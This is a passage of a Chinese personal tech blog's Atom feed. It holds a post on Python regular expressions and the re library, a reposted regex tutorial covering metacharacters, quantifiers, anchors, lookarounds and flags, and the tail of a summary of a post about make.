        &lt;p&gt;在Linux C/C++的开发过程中，当源代码文件较少时，我们可以手动使用gcc或g++进行编译链接，但是当源代码文件较多且依赖变得复杂时，我们就需要一种简单好用的工具来帮助我们管理。于是，make应运而生。&lt;/p&gt;
&lt;p&gt;make主要用来管理C/C++项目，通过Makef
      
    
    </summary>
    
      <category term="Linux" scheme="https://mingliangliu.com/categories/Linux/"/>
    
    
      <category term="Linux" scheme="https://mingliangliu.com/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>Python正则表达式</title>
    <link href="https://mingliangliu.com/posts/fc635c56/"/>
    <id>https://mingliangliu.com/posts/fc635c56/</id>
    <published>2019-10-09T13:11:38.000Z</published>
    <updated>2020-02-15T06:45:50.767Z</updated>
    
    <content type="html"><![CDATA[<p>python正则表达式的用途不过多赘述</p><p>python正则表达式的实现主要是通过python的re库，re库是python的标准库，所以无须安装</p><p>1.正则表达式的常用操作符</p><table><thead><tr><th>操作符</th><th>说明</th><th>实例</th></tr></thead><tbody><tr><td>.</td><td>表示任何单个字符</td><td></td></tr><tr><td>[ ]</td><td>字符集，对单个字符给出取值范围</td><td>[abc]表示a、b、c，[a‐z]表示a到z单个字符</td></tr><tr><td>[^ ]</td><td>非字符集，对单个字符给出排除范围</td><td>[^abc]表示非a或b或c的单个字符</td></tr><tr><td>*</td><td>前一个字符0次或无限次扩展</td><td>abc* 表示ab、abc、abcc、abccc等</td></tr><tr><td>+</td><td>前一个字符1次或无限次扩展</td><td>abc+ 表示abc、abcc、abccc等</td></tr><tr><td>?</td><td>前一个字符0次或1次扩展</td><td>abc? 表示ab、abc</td></tr><tr><td>&#124;</td><td>左右表达式任意一个</td><td>abc&#124;def表示abc、def</td></tr><tr><td>{m}</td><td>扩展前一个字符m次</td><td>ab{2}c表示abbc</td></tr><tr><td>{m,n}</td><td>扩展前一个字符m至n次（含n）</td><td>ab{1,2}c表示abc、abbc</td></tr><tr><td>^</td><td>匹配字符串开头</td><td>^abc表示abc且在一个字符串的开头</td></tr><tr><td>$</td><td>匹配字符串结尾</td><td>abc$表示abc且在一个字符串的结尾</td></tr><tr><td>( )</td><td>分组标记，内部只能使用</td><td>操作符&#124;(abc)表示abc，(abc&#124;def)表示abc、def</td></tr><tr><td>\d</td><td>数字，等价于[0‐9]</td><td></td></tr><tr><td>\w</td><td>单词字符，等价于[A‐Za‐z0‐9_]</td><td></td></tr></tbody></table><p>2.re库的使用</p><p>主要功能函数</p><table><thead><tr><th>函数</th><th>说明</th></tr></thead><tbody><tr><td>re.search()</td><td>在一个字符串中搜索匹配正则表达式的第一个位置，匹配成功返回match对象，否则返回None</td></tr><tr><td>re.match()</td><td>从一个字符串的开始位置起匹配正则表达式，匹配成功返回match对象，否则返回None</td></tr><tr><td>re.findall()</td><td>搜索字符串，以列表类型返回全部能匹配的子串</td></tr><tr><td>re.split()</td><td>将一个字符串按照正则表达式匹配结果进行分割，返回列表类型</td></tr><tr><td>re.finditer()</td><td>搜索字符串，返回一个匹配结果的迭代类型，每个迭代元素是match对象</td></tr><tr><td>re.sub()</td><td>在一个字符串中替换所有匹配正则表达式的子串，返回替换后的字符串</td></tr></tbody></table><p>更详细的说明请参考<a href="https://docs.python.org/zh-cn/3.7/library/re.html" target="_blank" rel="noopener">Python re文档</a></p><p>例如：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">re.search(pattern,string,flags=<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>其中：</p><ul><li>pattern : 正则表达式的字符串或原生字符串表示 </li><li>string : 待匹配字符串 </li><li>flags : 正则表达式使用时的控制标记</li></ul><table><thead><tr><th>常用标记</th><th>说明</th></tr></thead><tbody><tr><td>re.I或re.IGNORECASE</td><td>忽略正则表达式的大小写，[A‐Z]能够匹配小写字符</td></tr><tr><td>re.M或re.MULTILINE</td><td>正则表达式中的^操作符能够将给定字符串的每行当作匹配开始</td></tr><tr><td>re.S或re.DOTALL</td><td>正则表达式中的.操作符能够匹配所有字符，默认匹配除换行外的所有字符</td></tr></tbody></table><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> re</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>m = re.search(<span class="string">r'[1-9]\d&#123;5&#125;'</span>, <span class="string">'abc1234567'</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">if</span> m:</span><br><span class="line"><span class="meta">... </span>    m.group(<span class="number">0</span>)</span><br><span class="line">...</span><br><span class="line"><span class="string">'123456'</span></span><br></pre></td></tr></table></figure><p>还有一种写法是这样的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> re</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>t = re.compile(<span class="string">r'[1-9]\d&#123;5&#125;'</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>m = t.search(<span class="string">'abc1234567'</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">if</span> m:</span><br><span class="line"><span class="meta">... </span>    m.group(<span class="number">0</span>)</span><br><span class="line">...</span><br><span class="line"><span class="string">'123456'</span></span><br></pre></td></tr></table></figure><p>第二种写法的好处是：当要对一个正则表达式进行多次字符串匹配时，可以只编译一次，匹配多次，可以提升效率</p><p>3.Match对象</p><table><thead><tr><th>属性</th><th>说明</th></tr></thead><tbody><tr><td>.string</td><td>待匹配的文本</td></tr><tr><td>.re</td><td>匹配时使用的patter对象（正则表达式）</td></tr><tr><td>.pos</td><td>正则表达式搜索文本的开始位置</td></tr><tr><td>.endpos</td><td>正则表达式搜索文本的结束位置</td></tr><tr><td>.group()</td><td>获得匹配后的字符串</td></tr><tr><td>.start()</td><td>匹配字符串在原始字符串的开始位置</td></tr><tr><td>.end()</td><td>匹配字符串在原始字符串的结束位置</td></tr><tr><td>.span()</td><td>返回(.start(), .end())</td></tr></tbody></table><p>4.re库的贪婪匹配</p><p>re库默认采用贪婪匹配，即输出匹配长的子串</p><p>例如</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>match = re.search(<span class="string">r'PY.*N'</span>, <span class="string">'PYANBNCNDN'</span>)   </span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>match.group(<span class="number">0</span>)   </span><br><span class="line"><span class="string">'PYANBNCNDN'</span></span><br></pre></td></tr></table></figure><p>那么，如何输出最小的匹配呢</p><p>可以在<code>.*</code>后面加个<code>?</code>，就像这样</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>match = re.search(<span class="string">r'PY.*?N'</span>, <span class="string">'PYANBNCNDN'</span>)   </span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>match.group(<span class="number">0</span>) </span><br><span class="line"><span class="string">'PYAN'</span></span><br></pre></td></tr></table></figure><p>还有一些其他的操作符</p><table><thead><tr><th>操作符</th><th>说明</th></tr></thead><tbody><tr><td>*?</td><td>前一个字符0次或无限次扩展，小匹配</td></tr><tr><td>+?</td><td>前一个字符1次或无限次扩展，小匹配</td></tr><tr><td>??</td><td>前一个字符0次或1次扩展，小匹配</td></tr><tr><td>{m,n}?</td><td>扩展前一个字符m至n次（含n），最小匹配</td></tr></tbody></table>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;python正则表达式的用途不过多赘述&lt;/p&gt;
&lt;p&gt;python正则表达式的实现主要是通过python的re库，re库是python的标准库，所以无须安装&lt;/p&gt;
&lt;p&gt;1.正则表达式的常用操作符&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;操作符&lt;/th&gt;
      
    
    </summary>
    
      <category term="正则表达式" scheme="https://mingliangliu.com/categories/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"/>
    
    
      <category term="Python" scheme="https://mingliangliu.com/tags/Python/"/>
    
      <category term="正则表达式" scheme="https://mingliangliu.com/tags/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"/>
    
  </entry>
  
  <entry>
    <title>正则表达式</title>
    <link href="https://mingliangliu.com/posts/2f57a694/"/>
    <id>https://mingliangliu.com/posts/2f57a694/</id>
    <published>2019-10-08T14:33:13.000Z</published>
    <updated>2020-02-15T06:48:18.583Z</updated>
    
    <content type="html"><![CDATA[<p>本文转载自 <a href="https://github.com/ziishaned/learn-regex" target="_blank" rel="noopener">https://github.com/ziishaned/learn-regex</a> 侵删</p><h2 id="什么是正则表达式"><a href="#什么是正则表达式" class="headerlink" title="什么是正则表达式?"></a>什么是正则表达式?</h2><blockquote><p>正则表达式是一组由字母和符号组成的特殊文本, 它可以用来从文本中找出满足你想要的格式的句子.</p></blockquote><p>一个正则表达式是在一个主体字符串中从左到右匹配字符串时的一种样式.<br>“Regular expression”这个词比较拗口, 我们常使用缩写的术语”regex”或”regexp”.<br>正则表达式可以从一个基础字符串中根据一定的匹配模式替换文本中的字符串、验证表单、提取字符串等等.</p><p>想象你正在写一个应用, 然后你想设定一个用户命名的规则, 让用户名包含字符,数字,下划线和连字符,以及限制字符的个数,好让名字看起来没那么丑.<br>我们使用以下正则表达式来验证一个用户名:</p><img src="/images/正则表达式.png"><p>以上的正则表达式可以接受 <code>john_doe</code>, <code>jo-hn_doe</code>, <code>john12_as</code>.<br>但不匹配<code>Jo</code>, 因为它包含了大写的字母而且太短了.</p><h2 id="1-基本匹配"><a href="#1-基本匹配" class="headerlink" title="1. 基本匹配"></a>1. 基本匹配</h2><p>正则表达式其实就是在执行搜索时的格式, 它由一些字母和数字组合而成.<br>例如: 一个正则表达式 <code>the</code>, 它表示一个规则: 由字母<code>t</code>开始,接着是<code>h</code>,再接着是<code>e</code>.</p><pre>"the" => The fat cat sat on <a href="#learn-regex"><strong>the</strong></a> mat.</pre><p><a href="https://regex101.com/r/dmRygT/1" target="_blank" rel="noopener">在线练习</a></p><p>正则表达式<code>123</code>匹配字符串<code>123</code>. 它逐个字符的与输入的正则表达式做比较.</p><p>正则表达式是大小写敏感的, 所以<code>The</code>不会匹配<code>the</code>.</p><pre>"The" => <a href="#learn-regex"><strong>The</strong></a> fat cat sat on the mat.</pre><p><a href="https://regex101.com/r/1paXsy/1" target="_blank" rel="noopener">在线练习</a></p><h2 id="2-元字符"><a href="#2-元字符" class="headerlink" title="2. 元字符"></a>2. 元字符</h2><p>正则表达式主要依赖于元字符.<br>元字符不代表他们本身的字面意思, 他们都有特殊的含义. 一些元字符写在方括号中的时候有一些特殊的意思. 以下是一些元字符的介绍:</p><table><thead><tr><th align="center">元字符</th><th>描述</th></tr></thead><tbody><tr><td align="center">.</td><td>句号匹配任意单个字符除了换行符.</td></tr><tr><td align="center">[ ]</td><td>字符种类. 匹配方括号内的任意字符.</td></tr><tr><td align="center">[^ ]</td><td>否定的字符种类. 匹配除了方括号里的任意字符</td></tr><tr><td align="center">*</td><td>匹配&gt;=0个重复的在*号之前的字符.</td></tr><tr><td align="center">+</td><td>匹配&gt;=1个重复的+号前的字符.</td></tr><tr><td align="center">?</td><td>标记?之前的字符为可选.</td></tr><tr><td align="center">{n,m}</td><td>匹配num个大括号之前的字符 (n &lt;= num &lt;= m).</td></tr><tr><td align="center">(xyz)</td><td>字符集, 匹配与 xyz 完全相等的字符串.</td></tr><tr><td align="center">&#124;</td><td>或运算符,匹配符号前或后的字符.</td></tr><tr><td align="center">&#92;</td><td>转义字符,用于匹配一些保留的字符 <code>[ ] ( ) { } . * + ? ^ $ \ &#124;</code></td></tr><tr><td align="center">^</td><td>从开始行开始匹配.</td></tr><tr><td align="center">$</td><td>从末端开始匹配.</td></tr></tbody></table><h2 id="2-1-点运算符"><a href="#2-1-点运算符" class="headerlink" title="2.1 点运算符 ."></a>2.1 点运算符 <code>.</code></h2><p><code>.</code>是元字符中最简单的例子.<br><code>.</code>匹配任意单个字符, 但不匹配换行符.<br>例如, 表达式<code>.ar</code>匹配一个任意字符后面跟着是<code>a</code>和<code>r</code>的字符串.</p><pre>".ar" => The <a href="#learn-regex"><strong>car</strong></a> <a href="#learn-regex"><strong>par</strong></a>ked in the <a href="#learn-regex"><strong>gar</strong></a>age.</pre><p><a href="https://regex101.com/r/xc9GkU/1" target="_blank" rel="noopener">在线练习</a></p><h2 id="2-2-字符集"><a href="#2-2-字符集" class="headerlink" title="2.2 字符集"></a>2.2 字符集</h2><p>字符集也叫做字符类.<br>方括号用来指定一个字符集.<br>在方括号中使用连字符来指定字符集的范围.<br>在方括号中的字符集不关心顺序.<br>例如, 表达式<code>[Tt]he</code> 匹配 <code>the</code> 和 <code>The</code>.</p><pre>"[Tt]he" => <a href="#learn-regex"><strong>The</strong></a> car parked in <a href="#learn-regex"><strong>the</strong></a> garage.</pre><p><a href="https://regex101.com/r/2ITLQ4/1" target="_blank" rel="noopener">在线练习</a></p><p>方括号的句号就表示句号.<br>表达式 <code>ar[.]</code> 匹配 <code>ar.</code>字符串</p><pre>"ar[.]" => A garage is a good place to park a c<a href="#learn-regex"><strong>ar.</strong></a></pre><p><a href="https://regex101.com/r/wL3xtE/1" target="_blank" rel="noopener">在线练习</a></p><h3 id="2-2-1-否定字符集"><a href="#2-2-1-否定字符集" class="headerlink" title="2.2.1 否定字符集"></a>2.2.1 否定字符集</h3><p>一般来说 <code>^</code> 表示一个字符串的开头, 但它用在一个方括号的开头的时候, 它表示这个字符集是否定的.<br>例如, 表达式<code>[^c]ar</code> 匹配一个后面跟着<code>ar</code>的除了<code>c</code>的任意字符.</p><pre>"[^c]ar" => The car <a href="#learn-regex"><strong>par</strong></a>ked in the <a href="#learn-regex"><strong>gar</strong></a>age.</pre><p><a href="https://regex101.com/r/nNNlq3/1" target="_blank" rel="noopener">在线练习</a></p><h2 id="2-3-重复次数"><a href="#2-3-重复次数" class="headerlink" title="2.3 重复次数"></a>2.3 重复次数</h2><p>后面跟着元字符 <code>+</code>, <code>*</code> or <code>?</code> 的, 用来指定匹配子模式的次数.<br>这些元字符在不同的情况下有着不同的意思.</p><h3 id="2-3-1-号"><a href="#2-3-1-号" class="headerlink" title="2.3.1 * 号"></a>2.3.1 <code>*</code> 号</h3><p><code>*</code>号匹配 在<code>*</code>之前的字符出现<code>大于等于0</code>次.<br>例如, 表达式 <code>a*</code> 匹配0或更多个以a开头的字符. 表达式<code>[a-z]*</code> 匹配一个行中所有以小写字母开头的字符串.</p><pre>"[a-z]*" => T<a href="#learn-regex"><strong>he</strong></a> <a href="#learn-regex"><strong>car</strong></a> <a href="#learn-regex"><strong>parked</strong></a> <a href="#learn-regex"><strong>in</strong></a> <a href="#learn-regex"><strong>the</strong></a> <a href="#learn-regex"><strong>garage</strong></a> #21.</pre><p><a href="https://regex101.com/r/7m8me5/1" target="_blank" rel="noopener">在线练习</a></p><p><code>*</code>字符和<code>.</code>字符搭配可以匹配所有的字符<code>.*</code>.<br><code>*</code>和表示匹配空格的符号<code>\s</code>连起来用, 如表达式<code>\s*cat\s*</code>匹配0或更多个空格开头和0或更多个空格结尾的cat字符串.</p><pre>"\s*cat\s*" => The fat<a href="#learn-regex"><strong> cat </strong></a>sat on the con<a href="#learn-regex"><strong>cat</strong></a>enation.</pre><p><a href="https://regex101.com/r/gGrwuz/1" target="_blank" rel="noopener">在线练习</a></p><h3 id="2-3-2-号"><a href="#2-3-2-号" class="headerlink" title="2.3.2 + 号"></a>2.3.2 <code>+</code> 号</h3><p><code>+</code>号匹配<code>+</code>号之前的字符出现 &gt;=1 次.<br>例如表达式<code>c.+t</code> 匹配以首字母<code>c</code>开头以<code>t</code>结尾,中间跟着至少一个字符的字符串.</p><pre>"c.+t" => The fat <a href="#learn-regex"><strong>cat sat on the mat</strong></a>.</pre><p><a href="https://regex101.com/r/Dzf9Aa/1" target="_blank" rel="noopener">在线练习</a></p><h3 id="2-3-3-号"><a href="#2-3-3-号" class="headerlink" title="2.3.3 ? 号"></a>2.3.3 <code>?</code> 号</h3><p>在正则表达式中元字符 <code>?</code> 标记在符号前面的字符为可选, 即出现 0 或 1 次.<br>例如, 表达式 <code>[T]?he</code> 匹配字符串 <code>he</code> 和 <code>The</code>.</p><pre>"[T]he" => <a href="#learn-regex"><strong>The</strong></a> car is parked in the garage.</pre><p><a href="https://regex101.com/r/cIg9zm/1" target="_blank" rel="noopener">在线练习</a></p><pre>"[T]?he" => <a href="#learn-regex"><strong>The</strong></a> car is parked in t<a href="#learn-regex"><strong>he</strong></a> garage.</pre><p><a href="https://regex101.com/r/kPpO2x/1" target="_blank" rel="noopener">在线练习</a></p><h2 id="2-4-号"><a href="#2-4-号" class="headerlink" title="2.4 {} 号"></a>2.4 <code>{}</code> 号</h2><p>在正则表达式中 <code>{}</code> 是一个量词, 常用来一个或一组字符可以重复出现的次数.<br>例如,  表达式 <code>[0-9]{2,3}</code> 匹配最少 2 位最多 3 位 0~9 的数字.</p><pre>"[0-9]{2,3}" => The number was 9.<a href="#learn-regex"><strong>999</strong></a>7 but we rounded it off to <a href="#learn-regex"><strong>10</strong></a>.0.</pre><p><a href="https://regex101.com/r/juM86s/1" target="_blank" rel="noopener">在线练习</a></p><p>我们可以省略第二个参数.<br>例如, <code>[0-9]{2,}</code> 匹配至少两位 0~9 的数字.</p><pre>"[0-9]{2,}" => The number was 9.<a href="#learn-regex"><strong>9997</strong></a> but we rounded it off to <a href="#learn-regex"><strong>10</strong></a>.0.</pre><p><a href="https://regex101.com/r/Gdy4w5/1" target="_blank" rel="noopener">在线练习</a></p><p>如果逗号也省略掉则表示重复固定的次数.<br>例如, <code>[0-9]{3}</code> 匹配3位数字</p><pre>"[0-9]{3}" => The number was 9.<a href="#learn-regex"><strong>999</strong></a>7 but we rounded it off to 10.0.</pre><p><a href="https://regex101.com/r/Sivu30/1" target="_blank" rel="noopener">在线练习</a></p><h2 id="2-5-特征标群"><a href="#2-5-特征标群" class="headerlink" title="2.5 (...) 特征标群"></a>2.5 <code>(...)</code> 特征标群</h2><p>特征标群是一组写在 <code>(...)</code> 中的子模式. 例如之前说的 <code>{}</code> 是用来表示前面一个字符出现指定次数. 但如果在 <code>{}</code> 前加入特征标群则表示整个标群内的字符重复 N 次. 例如, 表达式 <code>(ab)*</code> 匹配连续出现 0 或更多个 <code>ab</code>.</p><p>我们还可以在 <code>()</code> 中用或字符 <code>|</code> 表示或. 例如, <code>(c|g|p)ar</code> 匹配 <code>car</code> 或 <code>gar</code> 或 <code>par</code>.</p><pre>"(c|g|p)ar" => The <a href="#learn-regex"><strong>car</strong></a> is <a href="#learn-regex"><strong>par</strong></a>ked in the <a href="#learn-regex"><strong>gar</strong></a>age.</pre><p><a href="https://regex101.com/r/tUxrBG/1" target="_blank" rel="noopener">在线练习</a></p><h2 id="2-6-或运算符"><a href="#2-6-或运算符" class="headerlink" title="2.6 | 或运算符"></a>2.6 <code>|</code> 或运算符</h2><p>或运算符就表示或, 用作判断条件.</p><p>例如 <code>(T|t)he|car</code> 匹配 <code>(T|t)he</code> 或 <code>car</code>.</p><pre>"(T|t)he|car" => <a href="#learn-regex"><strong>The</strong></a> <a href="#learn-regex"><strong>car</strong></a> is parked in <a href="#learn-regex"><strong>the</strong></a> garage.</pre><p><a href="https://regex101.com/r/fBXyX0/1" target="_blank" rel="noopener">在线练习</a></p><h2 id="2-7-转码特殊字符"><a href="#2-7-转码特殊字符" class="headerlink" title="2.7 转码特殊字符"></a>2.7 转码特殊字符</h2><p>反斜线 <code>\</code> 在表达式中用于转码紧跟其后的字符. 用于指定 <code>{ } [ ] / \ + * . $ ^ | ?</code> 这些特殊字符. 如果想要匹配这些特殊字符则要在其前面加上反斜线 <code>\</code>.</p><p>例如 <code>.</code> 是用来匹配除换行符外的所有字符的. 如果想要匹配句子中的 <code>.</code> 则要写成 <code>\.</code> 以下这个例子 <code>\.?</code>是选择性匹配<code>.</code></p><pre>"(f|c|m)at\.?" => The <a href="#learn-regex"><strong>fat</strong></a> <a href="#learn-regex"><strong>cat</strong></a> sat on the <a href="#learn-regex"><strong>mat.</strong></a></pre><p><a href="https://regex101.com/r/DOc5Nu/1" target="_blank" rel="noopener">在线练习</a></p><h2 id="2-8-锚点"><a href="#2-8-锚点" class="headerlink" title="2.8 锚点"></a>2.8 锚点</h2><p>在正则表达式中, 想要匹配指定开头或结尾的字符串就要使用到锚点. <code>^</code> 指定开头, <code>$</code> 指定结尾.</p><h3 id="2-8-1-号"><a href="#2-8-1-号" class="headerlink" title="2.8.1 ^ 号"></a>2.8.1 <code>^</code> 号</h3><p><code>^</code> 用来检查匹配的字符串是否在所匹配字符串的开头.</p><p>例如, 在 <code>abc</code> 中使用表达式 <code>^a</code> 会得到结果 <code>a</code>. 但如果使用 <code>^b</code> 将匹配不到任何结果. 因为在字符串 <code>abc</code> 中并不是以 <code>b</code> 开头.</p><p>例如, <code>^(T|t)he</code> 匹配以 <code>The</code> 或 <code>the</code> 开头的字符串.</p><pre>"(T|t)he" => <a href="#learn-regex"><strong>The</strong></a> car is parked in <a href="#learn-regex"><strong>the</strong></a> garage.</pre><p><a href="https://regex101.com/r/5ljjgB/1" target="_blank" rel="noopener">在线练习</a></p><pre>"^(T|t)he" => <a href="#learn-regex"><strong>The</strong></a> car is parked in the garage.</pre><p><a href="https://regex101.com/r/jXrKne/1" target="_blank" rel="noopener">在线练习</a></p><h3 id="2-8-2-号"><a href="#2-8-2-号" class="headerlink" title="2.8.2 $ 号"></a>2.8.2 <code>$</code> 号</h3><p>同理于 <code>^</code> 号, <code>$</code> 号用来匹配字符是否是最后一个.</p><p>例如, <code>(at\.)$</code> 匹配以 <code>at.</code> 结尾的字符串.</p><pre>"(at\.)" => The fat c<a href="#learn-regex"><strong>at.</strong></a> s<a href="#learn-regex"><strong>at.</strong></a> on the m<a href="#learn-regex"><strong>at.</strong></a></pre><p><a href="https://regex101.com/r/y4Au4D/1" target="_blank" rel="noopener">在线练习</a></p><pre>"(at\.)$" => The fat cat. sat. on the m<a href="#learn-regex"><strong>at.</strong></a></pre><p><a href="https://regex101.com/r/t0AkOd/1" target="_blank" rel="noopener">在线练习</a></p><h2 id="3-简写字符集"><a href="#3-简写字符集" class="headerlink" title="3. 简写字符集"></a>3. 简写字符集</h2><p>正则表达式提供一些常用的字符集简写. 如下:</p><table><thead><tr><th align="center">简写</th><th>描述</th></tr></thead><tbody><tr><td align="center">.</td><td>除换行符外的所有字符</td></tr><tr><td align="center">\w</td><td>匹配所有字母数字, 等同于 <code>[a-zA-Z0-9_]</code></td></tr><tr><td align="center">\W</td><td>匹配所有非字母数字, 即符号, 等同于: <code>[^\w]</code></td></tr><tr><td align="center">\d</td><td>匹配数字: <code>[0-9]</code></td></tr><tr><td align="center">\D</td><td>匹配非数字: <code>[^\d]</code></td></tr><tr><td align="center">\s</td><td>匹配所有空格字符, 等同于: <code>[\t\n\f\r\p{Z}]</code></td></tr><tr><td align="center">\S</td><td>匹配所有非空格字符: <code>[^\s]</code></td></tr><tr><td align="center">\f</td><td>匹配一个换页符</td></tr><tr><td align="center">\n</td><td>匹配一个换行符</td></tr><tr><td align="center">\r</td><td>匹配一个回车符</td></tr><tr><td align="center">\t</td><td>匹配一个制表符</td></tr><tr><td align="center">\v</td><td>匹配一个垂直制表符</td></tr><tr><td align="center">\p</td><td>匹配 CR/LF (等同于 <code>\r\n</code>)，用来匹配 DOS 行终止符</td></tr></tbody></table><h2 id="4-零宽度断言-前后预查"><a href="#4-零宽度断言-前后预查" class="headerlink" title="4. 零宽度断言(前后预查)"></a>4. 零宽度断言(前后预查)</h2><p>先行断言和后发断言都属于<strong>非捕获簇</strong>(不捕获文本 ，也不针对组合计进行计数).<br>先行断言用于判断所匹配的格式是否在另一个确定的格式之前, 匹配结果不包含该确定格式(仅作为约束).</p><p>例如, 我们想要获得所有跟在 <code>$</code> 符号后的数字, 我们可以使用正后发断言 <code>(?&lt;=\$)[0-9\.]*</code>.<br>这个表达式匹配 <code>$</code> 开头, 之后跟着 <code>0,1,2,3,4,5,6,7,8,9,.</code> 这些字符可以出现大于等于 0 次.</p><p>零宽度断言如下:</p><table><thead><tr><th align="center">符号</th><th>描述</th></tr></thead><tbody><tr><td align="center">?=</td><td>正先行断言-存在</td></tr><tr><td align="center">?!</td><td>负先行断言-排除</td></tr><tr><td align="center">?&lt;=</td><td>正后发断言-存在</td></tr><tr><td align="center">?&lt;!</td><td>负后发断言-排除</td></tr></tbody></table><h3 id="4-1-正先行断言"><a href="#4-1-正先行断言" class="headerlink" title="4.1 ?=... 正先行断言"></a>4.1 <code>?=...</code> 正先行断言</h3><p><code>?=...</code> 正先行断言, 表示第一部分表达式之后必须跟着 <code>?=...</code>定义的表达式.</p><p>返回结果只包含满足匹配条件的第一部分表达式.<br>定义一个正先行断言要使用 <code>()</code>. 在括号内部使用一个问号和等号: <code>(?=...)</code>. </p><p>正先行断言的内容写在括号中的等号后面.<br>例如, 表达式 <code>(T|t)he(?=\sfat)</code> 匹配 <code>The</code> 和 <code>the</code>, 在括号中我们又定义了正先行断言 <code>(?=\sfat)</code> ,即 <code>The</code> 和 <code>the</code> 后面紧跟着 <code>(空格)fat</code>.</p><pre>"(T|t)he(?=\sfat)" => <a href="#learn-regex"><strong>The</strong></a> fat cat sat on the mat.</pre><p><a href="https://regex101.com/r/IDDARt/1" target="_blank" rel="noopener">在线练习</a></p><h3 id="4-2-负先行断言"><a href="#4-2-负先行断言" class="headerlink" title="4.2 ?!... 负先行断言"></a>4.2 <code>?!...</code> 负先行断言</h3><p>负先行断言 <code>?!</code> 用于筛选所有匹配结果, 筛选条件为 其后不跟随着断言中定义的格式.<br><code>正先行断言</code>  定义和 <code>负先行断言</code> 一样, 区别就是 <code>=</code> 替换成 <code>!</code> 也就是 <code>(?!...)</code>.</p><p>表达式 <code>(T|t)he(?!\sfat)</code> 匹配 <code>The</code> 和 <code>the</code>, 且其后不跟着 <code>(空格)fat</code>.</p><pre>"(T|t)he(?!\sfat)" => The fat cat sat on <a href="#learn-regex"><strong>the</strong></a> mat.</pre><p><a href="https://regex101.com/r/V32Npg/1" target="_blank" rel="noopener">在线练习</a></p><h3 id="4-3-lt-正后发断言"><a href="#4-3-lt-正后发断言" class="headerlink" title="4.3 ?&lt;= ... 正后发断言"></a>4.3 <code>?&lt;= ...</code> 正后发断言</h3><p>正后发断言 记作<code>(?&lt;=...)</code> 用于筛选所有匹配结果, 筛选条件为 其前跟随着断言中定义的格式.<br>例如, 表达式 <code>(?&lt;=(T|t)he\s)(fat|mat)</code> 匹配 <code>fat</code> 和 <code>mat</code>, 且其前跟着 <code>The</code> 或 <code>the</code>.</p><pre>"(?<=(t|t)he\s)(fat|mat)" => The <a href="#learn-regex"><strong>fat</strong></a> cat sat on the <a href="#learn-regex"><strong>mat</strong></a>.</=(t|t)he\s)(fat|mat)"></pre><p><a href="https://regex101.com/r/avH165/1" target="_blank" rel="noopener">在线练习</a></p><h3 id="4-4-lt-负后发断言"><a href="#4-4-lt-负后发断言" class="headerlink" title="4.4 ?&lt;!... 负后发断言"></a>4.4 <code>?&lt;!...</code> 负后发断言</h3><p>负后发断言 记作 <code>(?&lt;!...)</code> 用于筛选所有匹配结果, 筛选条件为 其前不跟随着断言中定义的格式.<br>例如, 表达式 <code>(?&lt;!(T|t)he\s)(cat)</code> 匹配 <code>cat</code>, 且其前不跟着 <code>The</code> 或 <code>the</code>.</p><pre>"(?&lt;!(T|t)he\s)(cat)" => The cat sat on <a href="#learn-regex"><strong>cat</strong></a>.</pre><p><a href="https://regex101.com/r/8Efx5G/1" target="_blank" rel="noopener">在线练习</a></p><h2 id="5-标志"><a href="#5-标志" class="headerlink" title="5. 标志"></a>5. 标志</h2><p>标志也叫模式修正符, 因为它可以用来修改表达式的搜索结果.<br>这些标志可以任意的组合使用, 它也是整个正则表达式的一部分.</p><table><thead><tr><th align="center">标志</th><th>描述</th></tr></thead><tbody><tr><td align="center">i</td><td>忽略大小写.</td></tr><tr><td align="center">g</td><td>全局搜索.</td></tr><tr><td align="center">m</td><td>多行的: 锚点元字符 <code>^</code> <code>$</code> 工作范围在每行的起始.</td></tr></tbody></table><h3 id="5-1-忽略大小写-Case-Insensitive"><a href="#5-1-忽略大小写-Case-Insensitive" class="headerlink" title="5.1 忽略大小写 (Case Insensitive)"></a>5.1 忽略大小写 (Case Insensitive)</h3><p>修饰语 <code>i</code> 用于忽略大小写.<br>例如, 表达式 <code>/The/gi</code> 表示在全局搜索 <code>The</code>, 在后面的 <code>i</code> 将其条件修改为忽略大小写, 则变成搜索 <code>the</code> 和 <code>The</code>, <code>g</code> 表示全局搜索.</p><pre>"The" => <a href="#learn-regex"><strong>The</strong></a> fat cat sat on the mat.</pre><p><a href="https://regex101.com/r/dpQyf9/1" target="_blank" rel="noopener">在线练习</a></p><pre>"/The/gi" => <a href="#learn-regex"><strong>The</strong></a> fat cat sat on <a href="#learn-regex"><strong>the</strong></a> mat.</pre><p><a href="https://regex101.com/r/ahfiuh/1" target="_blank" rel="noopener">在线练习</a></p><h3 id="5-2-全局搜索-Global-search"><a href="#5-2-全局搜索-Global-search" 